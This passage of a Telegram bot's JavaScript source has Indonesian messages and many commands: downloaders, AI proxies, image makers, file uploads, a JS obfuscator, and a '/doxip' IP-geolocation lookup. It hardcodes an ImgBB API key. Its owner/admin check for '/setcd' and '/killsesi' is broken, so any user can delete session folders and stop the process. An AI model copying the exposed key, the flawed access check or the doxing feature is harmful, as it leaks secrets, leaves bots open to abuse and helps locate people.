  let out = String(code);

  out = out.replace(
    /const\s*\{\s*Telegraf\s*\}\s*=\s*require\(['"]telegraf['"]\);?/g,
    "const TelegramBot = require('node-telegram-bot-api');"
  );
  out = out.replace(
    /const\s+bot\s*=\s*new\s+Telegraf\((.+?)\);?/g,
    "const bot = new TelegramBot($1, { polling: true });"
  );

  out = out.replace(
    /bot\.command\(\s*['"]([^'"]+)['"]\s*,\s*\(ctx\)\s*=>\s*{/g,
    "bot.onText(/\\/$1(?:\\s+.*)?$/, (msg, match) => {"
  );
  out = out.replace(
    /bot\.start\(\s*\(ctx\)\s*=>\s*{/g,
    "bot.onText(/\\/start(?:\\s+.*)?$/, (msg, match) => {"
  );

  out = out.replace(
    /bot\.hears\(\s*(\/.+?\/[gimsuy]*)\s*,\s*\(ctx\)\s*=>\s*{/g,
    "bot.onText($1, (msg, match) => {"
  );

  out = out.replace(/\bctx\.chat\.id\b/g, "msg.chat.id");

  out = out.replace(
    /ctx\.reply\(\s*/g,
    "bot.sendMessage(msg.chat.id, "
  );

  out = out.replace(
    /ctx\.telegram\.sendMessage\(\s*([^)]+?),\s*/g,
    "bot.sendMessage($1, "
  );

  return out;
}

bot.command("convertcase", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    const target = (args[0] || "").toLowerCase();

    if (target !== "telegraf" && target !== "ntba") {
      return ctx.reply(
        "🪧 ☇ Format: reply kode yang ingin diubah"
      );
    }

    const replied = ctx.message.reply_to_message;
    if (!replied || !replied.text) {
      return ctx.reply("🪧 ☇ Reply ke pesan yang kode");
    }

    const sourceCode = replied.text;
    let result;

    if (target === "telegraf") {
      result = convertNtbaToTelegraf(sourceCode);
    } else {
      result = convertTelegrafToNtba(sourceCode);
    }

    if (!result || result.trim().length === 0) {
      return ctx.reply("❌ ☇ Gagal mengubah kode");
    }

    // kirim sebagai <pre> biar rapi
    await ctx.reply(
      `<b>Result (${target.toUpperCase()})</b>\n<pre>${escapeHtml(result)}</pre>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    try {
      await ctx.reply("❌ ☇ Terjadi error saat mengubah kode");
    } catch {}
  }
});


let uploadedJS = null;
let uploadedName = 'file.js';


bot.on('document', async (ctx) => {
  try {
    const doc = ctx.message.document;

   
    if (!doc.file_name.endsWith('.js')) {
      return ctx.reply('Kirim file dengan ekstensi .js agar bisa dibuka.');
    }

    uploadedName = doc.file_name;


    const fileLink = await ctx.telegram.getFileLink(doc.file_id);

    const res = await fetch(fileLink.href);
    uploadedJS = await res.text();

    await ctx.reply(`File **${uploadedName}** berhasil diupload. Ketik /openfile untuk melihat isinya.`);

  } catch (err) {
    console.error(err);
    ctx.reply('Gagal mengambil file JS.');
  }
});


bot.command('openfile', async (ctx) => {
  try {
    if (!uploadedJS) {
      return ctx.reply('Belum ada file JS yang diupload. Kirim file dulu.');
    }


    await ctx.replyWithDocument({
      source: Buffer.from(uploadedJS, 'utf8'),
      filename: uploadedName
    });


    const preview = uploadedJS.slice(0, 3500);

    await ctx.reply(`🔍 PREVIEW ISI FILE:\n\n<pre>${preview.replace(/[<>]/g, (c) => ({'<':'&lt;','>':'&gt;'}[c]))}</pre>`, {
      parse_mode: 'HTML'
    });

  } catch (err) {
    console.error(err);
    ctx.reply('Gagal membuka file JS.');
  }
});



// Command /iqc
bot.command("iqc", async (ctx) => {
  try {
    const message = ctx.message.text;
    const input = message.replace(/^\/iqc(@\w+)?\s*/, "").trim();
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    if (!input) {
      return ctx.reply(
        "❌ Format salah.\n\nContoh:\n`/iqc Ovalium | 00:00 | 80 | TELKOMSEL`",
        { parse_mode: "Markdown" }
      );
    }

    const parts = input.split("|").map(p => p.trim());
    const text = parts[0];
    const time = parts[1] || "00:00";
    const battery = parts[2] || "100";
    const carrier = parts[3] || "INDOSAT OOREDOO";

    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    await ctx.replyWithChatAction("upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    const caption = `
<blockquote>ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇᴅ ɢᴇɴᴇʀᴀᴛᴏʀ</blockquote>

💬 <code>${text}</code>
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}
`;

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/Xwarrxxx" }]
          ]
        }
      }
    );
  } catch (err) {
    console.error("❌ Error:", err.message);
    await ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");
  }
});

//ai

const gameEndpoints = [
    { command: 'tebakkalimat', endpoint: '/api/games/tebakkalimat', name: 'Tebak Kalimat' },
    { command: 'tebakjkt', endpoint: '/api/games/tebakjkt', name: 'Tebak JKT' },
    { command: 'tebaktebakan', endpoint: '/api/games/tebaktebakan', name: 'Tebak-tebakan' },
    { command: 'maths', endpoint: '/api/games/maths', name: 'Maths' },
    { command: 'lengkapikalimat', endpoint: '/api/games/lengkapikalimat', name: 'Lengkapi Kalimat' },
    { command: 'tebakheroml', endpoint: '/api/games/tebakheroml', name: 'Tebak Hero ML' },
    { command: 'tekateki', endpoint: '/api/games/tekateki', name: 'Teka Teki' }
];

gameEndpoints.forEach(game => {
    bot.command(game.command, async (ctx) => {
        try {
            await ctx.sendChatAction('typing');
            
            const response = await axios.get(`https://api.siputzx.my.id${game.endpoint}`);
            
            if (response.data && response.data.status === true) {
                const data = response.data.data;
                const soal = data.soal || data.pertanyaan || data.question || "Soal tidak tersedia";
                const jawaban = data.jawaban || data.answer || "Jawaban tidak tersedia";
                
                const messageText = `🎮 <b>${game.name}</b>\n\n<b>Soal:</b> ${soal}\n\n<b>Jawaban:</b> <tg-spoiler>${jawaban}</tg-spoiler>\n\n<i>*Ketuk kotak hitam di atas untuk melihat jawaban</i>`;
                
                await ctx.reply(messageText, { parse_mode: 'HTML' });
            } else {
                await ctx.reply('⚠️ Maaf, gagal mengambil data permainan.');
            }
        } catch (error) {
            await ctx.reply(`❌ Terjadi kesalahan saat memuat permainan ${game.name}.`);
        }
    });
});

 
 

async function tiktokDownloader(url){

    const api = `https://app.siputzx.my.id/api/d/tiktok?url=${encodeURIComponent(url)}`;

    // retry 3x
    for(let i=0;i<3;i++){

        try{

            const res = await axios.get(api,{ timeout:20000 });
            const json = res.data;

            if(!json.status) continue;

            const media = json.data.media || [];

            let hd = media.find(v =>
                v.quality === "HD" ||
                v.type === "video_hd"
            );

            let sd = media.find(v =>
                v.quality === "SD" ||
                v.type === "video"
            );

            const video =
                hd?.url ||
                hd?.backup ||
                sd?.url ||
                null;

            if(!video) continue;

            return {

                video: video,
                caption: json.data.title || "No description",
                author: json.data.author || "Unknown",
                thumbnail: json.data.thumbnail

            };

        }catch(e){

            if(i === 2){
                console.log("TT FAIL:", e.message);
            }

        }

    }

    return null;

}

bot.command("tt", async (ctx)=>{

try{

const url = ctx.message.text.split(" ")[1];

if(!url){
return ctx.reply(
`⚠️ Kirim link TikTok

Contoh:
/tt https://vt.tiktok.com/xxxx`
);
}

const msg = await ctx.reply("⏳ Processing video...");

const data = await tiktokDownloader(url);

if(!data){

await ctx.telegram.editMessageText(
ctx.chat.id,
msg.message_id,
null,
"❌ API gagal mengambil video"
);

return;
}

// kirim thumbnail dulu
if(data.thumbnail){

await ctx.replyWithPhoto(
{ url:data.thumbnail },
{
caption:
`🎬 TIKTOK DOWNLOADER

👤 ${data.author}

📝 ${data.caption}

📀 HD Quality
🚫 No Watermark`
}
);

}

// kirim video
await ctx.replyWithVideo(
{
url:data.video
},
{
caption:"✅ Download berhasil"
}
);

// edit loading
await ctx.telegram.deleteMessage(
ctx.chat.id,
msg.message_id
);

}catch(err){

console.log(err);

ctx.reply("❌ Terjadi error");

}

});




bot.command('ai', async (ctx) => {
    const prompt = ctx.message.text.split(' ').slice(1).join(' ');

    if (!prompt) {
        return ctx.reply('Silakan masukkan pertanyaan!\nContoh: `/ai Apa ibukota Prancis?`', { parse_mode: 'Markdown' });
    }

    try {
        await ctx.sendChatAction('typing');

        const response = await axios.get('https://api.siputzx.my.id/api/ai/gemini-lite', {
            params: {
                prompt: prompt,
                model: 'gemini-2.0-flash-lite'
            }
        });

        if (response.data && response.data.status === true) {
            const aiReply = response.data.data.parts[0].text;
            await ctx.reply(aiReply, { parse_mode: 'Markdown' });
        } else {
            await ctx.reply('⚠️ Maaf, gagal mendapatkan jawaban dari server AI.');
        }

    } catch (error) {
        console.error('Error command /ai:', error.message);
        await ctx.reply('❌ Terjadi kesalahan saat menghubungi server AI. Coba lagi nanti.');
    }
});


const dns = require('dns').promises;

// ==========================
// Command: /ip <domain>
// ==========================
bot.command('ip', async (ctx) => {
  try {
    const input = ctx.message.text.split(' ')[1];

    if (!input) {
      return ctx.reply('📘 Gunakan perintah:\n`/ip <domain atau IP>`\n\nContoh: `/ip google.com`', {
        parse_mode: 'Markdown',
      });
    }

    const domain = input.trim();

    await ctx.reply(`🔍 Mengecek informasi domain: \`${domain}\` ...`, { parse_mode: 'Markdown' });

    // Hasil penyimpanan
    let ipv4 = [];
    let ipv6 = [];
    let ns = [];

    try {
      ipv4 = await dns.resolve4(domain);
    } catch (err) {
      ipv4 = [];
    }

    try {
      ipv6 = await dns.resolve6(domain);
    } catch (err) {
      ipv6 = [];
    }

    try {
      ns = await dns.resolveNs(domain);
    } catch (err) {
      ns = [];
    }

    // Optional — cek lokasi IP (hanya IPv4 pertama)
    let locationInfo = '';
    if (ipv4.length > 0) {
      try {
        const res = await axios.get(`https://ipapi.co/${ipv4[0]}/json/`);
        const data = res.data;
        locationInfo = `${data.city ? data.city + ', ' : ''}${data.country_name ? data.country_name : ''}`;
      } catch {
        locationInfo = '';
      }
    }

    // Format hasil
    const result = `
🌐 *OVALIUM — IP & DNS CHECK*

🧭 Domain:
\`${domain}\`

📡 IPv4: ${ipv4.length ? ipv4.join(', ') : '❌ Tidak ditemukan'}
📡 IPv6: ${ipv6.length ? ipv6.join(', ') : '❌ Tidak ditemukan'}
🗂️ NS: ${ns.length ? ns.join(', ') : '❌ Tidak ditemukan'}

${locationInfo ? `📍 Lokasi: ${locationInfo}` : ''}
    `.trim();

    await ctx.replyWithMarkdown(result, { disable_web_page_preview: true });
  } catch (err) {
    console.error('Error /ip:', err);
    ctx.reply('❌ Terjadi kesalahan saat mengecek IP/DNS.');
  }
});



// Command /brat
bot.command('brat', async (ctx) => {
  const text = ctx.message.text;
  const users = loadData('users.json');

  // Ambil argumen setelah /brat
  const argsRaw = text.split(' ').slice(1).join(' ');

  if (!argsRaw) {
    return ctx.reply('Format: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const finalText = textParts.join(' ');
    if (!finalText) {
      return ctx.reply('Teks tidak boleh kosong!');
    }

    if (isAnimated && (delay < 100 || delay > 1500)) {
      return ctx.reply('Delay harus antara 100–1500 ms.');
    }

    await ctx.reply('⏳ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ʙʀᴀᴛ...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(finalText)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    await ctx.replyWithSticker({ source: buffer });
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    await ctx.reply('Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.command("chatgpt", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) {
      return ctx.reply("🪧 ☇ Format: /chatgpt siapa itu xwar");
    }

    const question = args;

    const processMsg = await ctx.reply("⏳ ☇ Chatgpt sedang memproses");

    try {
      const response = await axios.post(
        "https://api.nekolabs.web.id/ai/gpt/5",
        {
          text: question,
          systemPrompt: "You are a helpful assistant",
          sessionId: "apophis"
        },
        {
          headers: {
            "Content-Type": "application/json"
          },
          timeout: 30000
        }
      );

      if (response.data && response.data.success && response.data.result) {
        const answer = response.data.result;
        
        let finalAnswer = answer;
        if (finalAnswer.length > 3000) {
          finalAnswer = finalAnswer.substring(0, 3000) + "\n\n( jawaban dipotong )";
        }

        await ctx.reply(`${finalAnswer}`);
        
      } else {
        await ctx.reply("❌ Tidak ada jawaban dari ai");
      }

    } catch (apiError) {
      
      let errorMessage = "❌ ☇ Gagal menghubungi ai";
      
      if (apiError.response?.status === 401) {
        errorMessage = "❌ ☇ Apikey tidak valid";
      } else if (apiError.response?.status === 429) {
        errorMessage = "❌ ☇ Gagal menghubungi api, coba lagi nanti";
      } else {
        errorMessage = `❌ ☇ Gagal menghubungi api, coba lagi nanti`;
      }
      
      await ctx.reply(errorMessage);
    }

    try {
      await ctx.deleteMessage(processMsg.message_id);
    } catch (e) {}

  } catch (error) {
    await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
if (!tokenValidated) {
            return;
        }
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("tourl", async (ctx) => {
if (!tokenValidated) {
            return;
        }
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});




// === Command: /trackip dan /doxip ===
bot.command(["trackip", "doxip"], async (ctx) => {
  const messageText = ctx.message.text.trim();
  const parts = messageText.split(/\s+/);
  const commandName = parts[0].replace("/", "");
  const ip = parts[1];

  if (!ip) {
    return ctx.reply(`📌 Contoh: /${commandName} 112.90.150.204`);
  }

  try {
    const { data: res } = await axios.get(`https://ipwho.is/${encodeURIComponent(ip)}`);

    if (!res || res.success === false || !res.ip) {
      return ctx.reply(`❌ Tidak ada data untuk IP ${ip}`);
    }

    const infoMsg = `
<b>🌐 IP Information</b>
• <b>IP:</b> ${res.ip}
• <b>Type:</b> ${res.type || "N/A"}
• <b>Country:</b> ${res.country || "N/A"} ${res.flag?.emoji || ""}
• <b>Region:</b> ${res.region || "N/A"}
• <b>City:</b> ${res.city || "N/A"}
• <b>Latitude:</b> ${res.latitude ?? "N/A"}
• <b>Longitude:</b> ${res.longitude ?? "N/A"}
• <b>ISP:</b> ${res.connection?.isp || "N/A"}
• <b>Org:</b> ${res.connection?.org || "N/A"}
• <b>Domain:</b> ${res.connection?.domain || "N/A"}
• <b>Timezone:</b> ${res.timezone?.id || "N/A"}
• <b>Local Time:</b> ${res.timezone?.current_time || "N/A"}
`.trim();

    // kirim lokasi (jika latitude & longitude valid)
    if (typeof res.latitude === "number" && typeof res.longitude === "number") {
      await ctx.replyWithLocation(res.latitude, res.longitude);
    }

    // kirim info teks
    await ctx.reply(infoMsg, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🌍 Lihat di Google Maps",
              url: `https://www.google.com/maps?q=${res.latitude},${res.longitude}`,
            },
          ],
        ],
      },
    });
  } catch (err) {
    console.error("❌ TrackIP error:", err.message);
    ctx.reply(`❌ Error: Tidak dapat mengambil data untuk IP ${ip}`);
  }
});


const allowedFile = path.join(__dirname, 'allowedGroups.json');

function loadAllowedGroups() {
    if (!fs.existsSync(allowedFile)) {
        fs.writeFileSync(allowedFile, JSON.stringify([], null, 2));
    }
    return JSON.parse(fs.readFileSync(allowedFile));
}

function saveAllowedGroups(data) {
    fs.writeFileSync(allowedFile, JSON.stringify(data, null, 2));
}

// ADD GROUP MANUAL (ID INPUT)
bot.command("addgroup", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk pemilik bot.");

    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("🪧 Format: /addgroup -1001234567890");
    }

    const groupId = parseInt(args[1]);

    if (isNaN(groupId) || !`${groupId}`.startsWith("-")) {
        return ctx.reply("⚠️ ID grup tidak valid! Gunakan format: -100xxxxxxxxxx");
    }

    const allowed = loadAllowedGroups();

    if (allowed.includes(groupId)) {
        return ctx.reply("⚠️ Grup sudah terdaftar.");
    }

    allowed.push(groupId);
    saveAllowedGroups(allowed);

    ctx.reply(`✅ Grup ${groupId} berhasil ditambahkan ke allowed group.`);
});

// DELETE GROUP MANUAL (ID INPUT)
bot.command("delgroup", async (ctx) => {
    if (ctx.from.id != ownerID) return ctx.reply("❌ Akses hanya untuk pemilik bot.");

    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("🪧 Format: /delgroup -1001234567890");
    }

    const groupId = parseInt(args[1]);

    if (isNaN(groupId) || !`${groupId}`.startsWith("-")) {
        return ctx.reply("⚠️ ID grup tidak valid! Gunakan format: -100xxxxxxxxxx");
    }

    let allowed = loadAllowedGroups();

    if (!allowed.includes(groupId)) {
        return ctx.reply("⚠️ Grup tidak ditemukan di allowed group.");
    }

    allowed = allowed.filter(id => id !== groupId);
    saveAllowedGroups(allowed);

    ctx.reply(`🗑 Grup ${groupId} berhasil dihapus dari allowed group.`);
});

// LIST GROUP MANUAL
bot.command("listallowedgroup", async (ctx) => {
    const allowed = loadAllowedGroups();
    if (allowed.length === 0) {
        return ctx.reply("📭 Tidak ada grup yang terdaftar.");
    }

    let msg = `📌 *Daftar Allowed Group:*\n\n`;

    allowed.forEach(id => {
        msg += `• ${id}\n`;
    });

    ctx.reply(msg, { parse_mode: "Markdown" });
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
if (!tokenValidated) {
            return;
        }
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
if (!tokenValidated) {
            return;
        }
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

let menuEnabled = true;
bot.command("bot", async (ctx) => {
  if (ctx.from.id != 5923959728) return ctx.reply("❌ Akses ditolak. Hanya owner yang bisa mengatur menu.");

  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0] || !["on", "off"].includes(args[0].toLowerCase()))
    return ctx.reply("⚠️ Format salah!\nGunakan:\n/menu on\n/menu off");

  if (args[0].toLowerCase() === "on") {
    menuEnabled = true;
    await ctx.reply("✅ Menu dihidupkan. Bot akan menampilkan menu seperti biasa.");
  } else {
    menuEnabled = false;
    await ctx.reply("⚠️ Menu dimatikan. Bot tidak akan menampilkan menu.");
  }
});

bot.command("setcd", async (ctx) => {
  const userId = ctx.from.id.toString();

  // 🔐 Cek apakah token sudah diverifikasi
  if (!tokenValidated) {
            return;
        }


  // 👑 Cek apakah user adalah owner
    if (ctx.from.id != ownerID && !isAdmin && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

  // 💬 Ambil argumen cooldown
  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);

  if (isNaN(seconds) || seconds < 0) {
    return ctx.reply("⚠️ Contoh penggunaan: /setcd 5");
  }

  // ✅ Simpan cooldown
  cooldown = seconds;
  saveCooldown(seconds);

  ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
if (!tokenValidated) {
            return;
        }

    if (ctx.from.id != ownerID && !isAdmin && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
  

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});




//adduser


const adminFile = path.join(__dirname, "admin.json");
const ownerFile = path.join(__dirname, "owner.json");

function loadOwners() {
    if (!fs.existsSync(ownerFile)) {
        fs.writeFileSync(ownerFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(ownerFile));
}

function saveOwners(owners) {
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));
}

function addOwnerUser(userId) {
    let owners = loadOwners();
    if (owners.includes(userId)) return false;
    owners.push(userId);
    saveOwners(owners);
    return true;
}

function delOwnerUser(userId) {
    let owners = loadOwners();
    if (!owners.includes(userId)) return false;
    owners = owners.filter(id => id !== userId);
    saveOwners(owners);
    return true;
}

function isOwner(userId) {
    let owners = loadOwners();
    return owners.includes(userId);
}

function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

// ==================== POLLING TELEGRAM SYSTEM ====================
// Polling LANGSUNG HAPUS setelah dipilih

const activeTelegramPolls = new Map();
const POLL_EXPIRY_TIME = 3 * 60 * 1000; // 3 menit

// Fungsi untuk membuat polling konfirmasi
async function createConfirmationPoll(ctx, question, options = ['✅ Ya', '❌ Tidak']) {
    try {
        const pollMessage = await ctx.replyWithPoll(
            question,
            options,
            {
                is_anonymous: false,
                allows_multiple_answers: false,
                reply_to_message_id: ctx.message?.reply_to_message?.message_id
            }
        );

        return pollMessage;
    } catch (error) {
        console.error('Error creating poll:', error);
        return null;
    }
}

// SATU HANDLER UNTUK SEMUA POLLING - LANGSUNG HAPUS
bot.on("poll_answer", async (ctx) => {
    try {
        const pollId = ctx.pollAnswer.poll_id;
        const userId = ctx.pollAnswer.user.id.toString();
        const selectedOption = ctx.pollAnswer.option_ids[0];

